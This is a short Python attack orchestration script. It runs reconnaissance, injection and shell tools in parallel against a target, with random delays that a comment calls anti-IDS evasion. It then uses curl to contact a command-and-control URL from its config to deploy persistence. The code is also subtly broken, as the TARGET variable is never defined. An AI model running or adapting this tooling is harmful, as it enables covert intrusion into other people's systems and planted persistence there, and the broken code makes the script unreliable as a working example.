#!/usr/bin/env python3
import yaml, subprocess, threading, time, random
from pathlib import Path

with open("config.yaml") as f:
    config = yaml.safe_load(f)

def run_tool(tool, args=[]):
    cmd = [tool] + args
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(f"[+] {tool}: {result.returncode==0}")

# Parallel execution dengan random delay (anti-IDS)
threads = []
for tool in ["recon.sh", "inject.py", "shell.py"]:
    t = threading.Thread(target=run_tool, args=(tool, [TARGET]))
    t.start()
    threads.append(t)
    time.sleep(random.randint(1,3))

# Auto-deploy persistence
subprocess.run(["curl", "-d", f"persist={config['c2']['beacon_port']}", 
                f"{config['c2']['url']}/deploy"])